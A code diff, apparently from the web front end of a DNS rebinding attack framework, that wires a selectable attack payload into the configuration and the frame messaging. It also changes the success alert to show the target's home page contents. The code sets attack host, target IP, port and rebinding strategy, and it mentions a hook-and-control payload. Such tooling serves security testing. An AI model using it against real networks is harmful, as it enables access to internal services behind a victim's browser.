@@ -30,6 +30,7 @@ const Configuration = () => {
     let targetHostIPAddress = null;
     let dummyPort = null;
     let indexToken = null;
+    let attackPayload = null;
     let interval = null;
     let rebindingStrategy = null;
     let flushDns = null;
@@ -128,6 +129,12 @@ const Configuration = () => {
         getIndexToken() {
             return indexToken;
         },
+        getAttackPayload() {
+            return attackPayload;
+        },
+        setAttackPayload(attackPayloadName) {
+            attackPayload = attackPayloadName;
+        },
         getInterval() {
             return interval;
         },
@@ -153,6 +160,7 @@ const Configuration = () => {
             flushDns = configObject.flushDns;
             interval = configObject.interval;
             indexToken = configObject.indexToken;
+            attackPayload = configObject.attackPayload;
             hideActivity = configObject.hideActivity;
             delayDOMLoad = configObject.delayDOMLoad;
             rebindingSuccessFn = configObject.rebindingSuccessFn;
@@ -334,7 +342,7 @@ const App = () => {
         document.getElementById('flushdns').checked = configuration.getFlushDns();
     };
 
-    function generateAttackUrl(targetHostIPAddress, targetPort, payload) {//TKTK payload unused
+    function generateAttackUrl(targetHostIPAddress, targetPort) {
         return hosturl
             .replace("%1", configuration.getAttackHostIPAddress())
             .replace("%2", targetHostIPAddress) // replace(/-/g, '--'))
@@ -342,7 +350,6 @@ const App = () => {
             .replace("%4", configuration.getRebindingStrategy())
             .replace("%5", configuration.getAttackHostDomain())
             .replace("%6", targetPort)
-            //.replace("%7", payload + "?rnd=" + Math.random())
             .replace("%7", "soopayload.html" + "?rnd=" + Math.random())
     };
 
@@ -354,9 +361,10 @@ const App = () => {
             return configuration;
         },
 
-        attackTarget(targetHostIPAddress, targetPort, payload) {
+        attackTarget(targetHostIPAddress, targetPort) {
             let self = this;
-            let fid = self.getFrameManager().addFrame(generateAttackUrl(targetHostIPAddress, targetPort, payload))
+            let fid = self.getFrameManager().addFrame(generateAttackUrl(targetHostIPAddress, targetPort, 
+                self.getConfiguration().getAttackPayload()));
 
             self.addFrameToDOM(self.getFrameManager().frame(fid));
             self.getFrameManager().frame(fid).setTimer(setInterval((() => {
@@ -431,7 +439,7 @@ const App = () => {
                 clearInterval(fm.frame(fid).getTimer());
                 msg.source.postMessage({
                     cmd: "payload",
-                    param: document.getElementById("payloads").value
+                    param: configuration.getAttackPayload()
                 }, "*");
                 msg.source.postMessage({
                     cmd: "interval",
@@ -489,6 +497,10 @@ const App = () => {
             const UiFlushDns = document.getElementById("flushdns").checked;
             configuration.setFlushDns(UiFlushDns);
 
+            const UiAttackPayloadName = document.getElementById("payloads").value;
+            configuration.setAttackPayload(UiAttackPayloadName);
+            
+
             let fid = fm.addFrame(hosturl
                 .replace("%1", document.getElementById("attackhostipaddress").value)
                 .replace("%2", document.getElementById("targethostipaddress").value.replace(/-/g, '--'))
@@ -497,7 +509,7 @@ const App = () => {
                 .replace("%5", document.getElementById("attackhostdomain").value)
                 .replace("%6", document.getElementById("targetport").value)
                 //.replace("%7", document.getElementById("payloads").value) + "?rnd=" + Math.random());
-                .replace("%7", "/soopayload.html") + "?rnd=" + Math.random());
+                .replace("%7", "soopayload.html") + "?rnd=" + Math.random());
 
             self.addFrameToDOM(fm.frame(fid));
 
@@ -518,7 +530,7 @@ function rebindingSuccessCb(msg) {
     if ((app.getConfiguration().getAlertSuccess() !== "false") &&
         (app.getConfiguration().getType() === "manager") &&
         (document.getElementById("payloads").value !== "payload-hook-and-control.html")) {//TKTK change name
-        alert("Attack Successful: " + document.domain + " " + msg.data.response);
+        alert("Attack Successful from " + document.domain + ".\n" + "Target home page contents:\n" + msg.data.response);
     }
 
 }
